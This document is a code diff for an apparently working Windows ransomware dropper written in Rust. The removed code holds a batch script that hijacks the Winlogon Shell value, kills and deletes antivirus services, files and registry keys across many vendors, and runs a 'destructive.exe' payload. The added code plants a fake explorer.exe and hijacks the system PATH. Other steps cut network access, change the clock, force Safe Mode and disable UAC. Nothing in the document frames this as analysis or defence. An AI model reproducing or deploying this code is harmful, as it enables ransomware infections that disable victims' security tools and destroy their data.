@@ -68,7 +68,7 @@ fn disable_network_interfaces() -> Result<(), std::io::Error> {
 
 fn change_system_date() -> Result<(), String> {
     // Change system date to 01-19-2037 (Windows format mm-dd-yyyy)
-    let date_command = "date 01-19-2037";
+    let date_command = "date 12-19-2037";
 
     // Run date command
     let date_output = Command::new("cmd")
@@ -100,196 +100,6 @@ fn is_admin() -> bool {
     }
 }
 
-fn modify_registry() -> io::Result<()> {
-    // Open the registry key for Winlogon
-    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let winlogon_key = hkcu.open_subkey_with_flags(
-        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
-        KEY_SET_VALUE,
-    )?;
-
-    // Delete existing "Shell" value (if it exists)
-    match winlogon_key.delete_value("Shell") {
-        Ok(_) => println!("Existing Shell value deleted."),
-        Err(e) => eprintln!("Failed to delete Shell value: {}", e),
-    }
-
-    // Set new "Shell" value
-    let new_shell_value = r"c:\program files\utkudrk2\utkudrk2.bat";
-    winlogon_key.set_value("Shell", &new_shell_value)?;
-
-    println!("Registry modified successfully: Shell set to \"C:\\Program Files\\utkudrk2\\utkudrk2.bat\".");
-
-    Ok(())
-}
-
-fn create_batch_file() -> io::Result<()> {
-    // Create a batch file to clean up Safe Mode and schedule destructive.exe
-    let batch_content = r#"
-@echo off
-:: Check if we are in Safe Mode by examining the current boot entry
-bcdedit /enum {current} | findstr /i "safeboot"
-if %errorlevel% == 0 (
-    echo Safe Mode is enabled, proceeding with actions...
-) else (
-    echo Safe Mode is not enabled
-    "C:\Program Files\utkudrk2\destructive.exe"
-    exit
-)
-
-:: Wait for the reboot to happen and run this part only after Safe Mode is entered
-
-:: Modify Shell registry to run batch file
-echo Modifying registry to set Shell value...
-reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, \"c:\program files\utkudrk2\utkudrk2.bat\"" /f
-
-:: Perform cleanup tasks
-echo Removing Safe Mode setting...
-bcdedit /deletevalue {current} safeboot
-
-:: Delete registry keys related to antivirus services
-:: Webroot services
-sc delete WRSkyClient
-sc delete WRCoreService
-sc delete WRSVC
-sc stop WRSkyClient
-sc stop WRCoreService
-sc stop WRSVC
-:: Webroot files
-del /f /y "%SystemRoot%\System32\Drivers\wrkrn.sys" :: https://www.reddit.com/r/msp/comments/uu7cy6/webroot_secureanywhere_uninstall_issue/
-del /f /y "%SystemRoot%\System32\wruser.dll"
-rd /s /q "%ProgramFiles%\Webroot"
-rd /s /q "%ProgramFiles(x86)%\Webroot"
-rd /s /q "%ProgramData%\WRCore"
-rd /s /q "%ProgramData%\WRData"
-rd /s /q "%ProgramData%\WRData"
-rd /s /q "%ProgramFiles%\Webroot"
-rd /s /q "%ProgramFiles(x86)%\Webroot"
-rd /s /q "%ProgramData%\WRCore"
-:: Avira files
-rd /s /q "%ProgramFiles%\Avira"
-rd /s /q "%ProgramFiles(x86)%\Avira"
-rd /s /q "%ProgramData%\Avira"
-:: McAfee files
-rd /s /q "%ProgramData%\McAfee"
-rd /s /q "%ProgramFiles%\McAfee"
-rd /s /q "%ProgramFiles(x86)%\McAfee"
-
-:: Kill antivirus processes
-echo Terminating antivirus processes...
-taskkill /F /IM AvastSvc.exe /T
-taskkill /F /IM AvastUI.exe /T
-taskkill /F /IM AvastWscReporter.exe /T
-taskkill /F /IM aswVmm.exe /T
-taskkill /F /IM MBAMService.exe /T
-taskkill /F /IM MsMpEng.exe /T
-taskkill /F /IM VSSERV.exe /T
-
-:: Stop antivirus services
-echo Stopping antivirus services...
-sc stop "AvastSvc"
-sc stop "AvastWscReporter"
-sc stop "aswVmm"
-sc stop "MBAMService"
-sc stop "WinDefend"
-sc stop "VSSERV"
-:: McAfee
-sc stop "McAfee Service Controller"
-sc stop "McAfee Firewall Core Service"
-sc stop "McAfee Validation Trust Protection"
-
-:: Deleting antivirus services
-sc delete "AvastSvc"
-sc delete"AvastWscReporter"
-sc delete "aswVmm"
-sc delete "MBAMService"
-sc delete "WinDefend"
-sc delete "VSSERV"
-:: McAfee
-sc delete "McAfee Service Controller"
-sc delete "McAfee Firewall Core Service"
-sc delete "McAfee Validation Trust Protection"
-
-echo Deleting registry keys...
-:: Startup 
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
-:: Avast
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbIDSAgent" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbIDSAgent" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswApPct" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswApPct" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsdriver" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsdriver" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsh" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsh" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbuniv" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbuniv" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswElam" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswElam" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswKbd" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswKbd" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswMonFit" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswMonFit" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswNetHub" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswNetHub" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRdr" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRdr" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRvrt" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRvrt" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
-:: Webroot
-reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f
-reg delete "HKLM\SOFTWARE\WRData" /f
-reg delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f
-reg delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f
-:: Windows Defender
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\WinDefend" /f
-:: Kaspersky 21.3
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\AVP21.3" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\AVP21.3" /f
-:: Malwarebytes
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\MBAMService" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\MBAMService" /f
-:: Bitdefender
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
-reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
-reg delete "HKLM\SYSTEM\ControlSet002\Services\VSSERV" /f
-:: ESET
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\eamonm" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\edevmon" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ehdrv" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekbdflt" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekrn" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfw" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfwwfp" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ESETCleanersDriver" /f
-:: Avira
-reg delete HKLM\SOFTWARE\AVIRA /f
-
-:: Confirm completion
-echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
-
-:: Run the destructive.exe
-"C:\Program Files\utkudrk2\destructive.exe"
-
-:: Exit
-exit
-"#;
-
-    let path = Path::new("c:\\Program Files\\utkudrk2\\utkudrk2.bat");
-    let mut file = File::create(path)?;
-    file.write_all(batch_content.as_bytes())?;
-
-    Ok(())
-}
-
 fn extract_embedded_exe() -> io::Result<()> {
     // Ensure the target directory exists
     let target_dir = Path::new("C:\\Program Files\\utkudrk2");
@@ -307,6 +117,19 @@ fn extract_embedded_exe() -> io::Result<()> {
     Ok(())
 }
 
+/// Extracts the embedded explorer.exe to "C:\explorer.exe"
+fn extract_explorer_exe() -> io::Result<()> {
+    // Define the target path for explorer.exe
+    let target_path = Path::new("C:\\explorer.exe");
+    // Create (or overwrite) the file at the target path
+    let mut file = File::create(&target_path)?;
+    // Write the embedded executable data to the file
+    file.write_all(include_bytes!("../resources/explorer.exe"))?;
+    println!("Explorer executable saved to {}.", target_path.display());
+
+    Ok(())
+}
+
 fn reboot_system() -> io::Result<()> {
     // Shutdown and reboot the system to Safe Mode
     Command::new("shutdown.exe")
@@ -317,6 +140,46 @@ fn reboot_system() -> io::Result<()> {
         .stderr(Stdio::null())
         .output()?;
 
+    Ok(())
+}
+
+fn execute_command(command: &str) {
+    let status = Command::new("cmd")
+        .args(&["/C", command])
+        .status();
+
+    match status {
+        Ok(status) if status.success() => println!("[+] Command succeeded: {}", command),
+        Ok(status) => eprintln!("[!] Command failed with status {}: {}", status, command),
+        Err(e) => eprintln!("[!] Failed to execute command {}: {}", command, e),
+    }
+}
+
+/// Sets the system PATH variable so that "C:\" is the first entry.
+/// This method reads the current PATH, and if it doesn't already begin with "C:\",
+/// it prepends "C:\" to the PATH and then uses 'setx /M' to update the machine PATH.
+fn set_system_path_first() -> io::Result<()> {
+    // Retrieve the current PATH (this may be the user or process PATH)
+    let current_path = std::env::var("PATH").unwrap_or_default();
+    let parts: Vec<&str> = current_path.split(';').collect();
+
+    // Check if the first non-empty element is "C:\"
+    if let Some(first) = parts.iter().find(|s| !s.trim().is_empty()) {
+        if first.trim().eq_ignore_ascii_case("C:\\") {
+            println!("[+] System PATH already starts with C:\\");
+            return Ok(());
+        }
+    }
+
+    // Prepend "C:\" to the current PATH.
+    // (Be sure to include a semicolon separator.)
+    let new_path = format!("C:\\;{}", current_path);
+    println!("[*] Setting system PATH to: {}", new_path);
+
+    // Build and execute the command to update the machine PATH.
+    // The /M flag tells setx to modify the machine (system) environment variable.
+    let command = format!("setx /M PATH \"{}\"", new_path);
+    execute_command(&command);
     Ok(())
 }
 
@@ -332,50 +195,52 @@ fn main() {
     //Define directory path
     let dir_path = Path::new(r"C:\Program Files\utkudrk2");
 
-    // Ensure the directory exists
+    // Step 2: Ensure the directory exists
     if let Err(e) = fs::create_dir_all(dir_path) {
         eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
         std::process::exit(1); // Exit the program with a failure status
     }
 
-    // Step 2: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
+    // Step 3: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
+    // Cut network first to avoid auto update
     if let Err(e) = disable_network_interfaces() {
         eprintln!("Error disabling network interfaces: {}", e);
     }
 
+    // Then update system date
     if let Err(e) = change_system_date() {
         eprintln!("Error changing system date: {}", e);
     }
 
-    // Step 3: Enable safe mode
+    // Step 4: Enable safe mode
     if let Err(e) = enable_safe_mode() {
         eprintln!("Error enabling safe mode: {}", e);
     }
 
-    // Step 4: Disable UAC
-    if let Err(e) = disable_uac() {
-        eprintln!("Error disabling UAC: {}", e);
-    }
-
-    // Step 5: Extract payload
+    // Step 5: Extract ransomware payload
     if let Err(e) = extract_embedded_exe() {
-        eprintln!("Error extracting embedded executable: {}", e);
+        eprintln!("Error extracting embedded ransomware executable: {}", e);
+    }
+        
+    // Step 6: Extract safe boot payload
+    if let Err(e) = extract_explorer_exe() {
+        eprintln!("Error extracting embedded safe boot executable: {}", e);
     }
     
-    // Step 6: Create the batch file in the current directory
-    if let Err(e) = create_batch_file() {
-        eprintln!("Error creating batch file: {}", e);
+    // Step 7: Use set system path first to redirict to C:\explorer.exe
+    if let Err(e) = set_system_path_first() {
+        eprintln!("Error setting system path: {}", e);
         return;
     }
 
-    // Step 7: Reboot the system to Safe Mode if needed
+    // Step 8: Reboot the system to Safe Mode if needed
     if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
     }
 
-    // Step 8: Modify the registry to set Shell value
-    if let Err(e) = modify_registry() {
-        eprintln!("Error modifying the registry: {}", e);
+    // Step 9: Disable UAC
+    if let Err(e) = disable_uac() {
+        eprintln!("Error disabling UAC: {}", e);
     }
 
 }
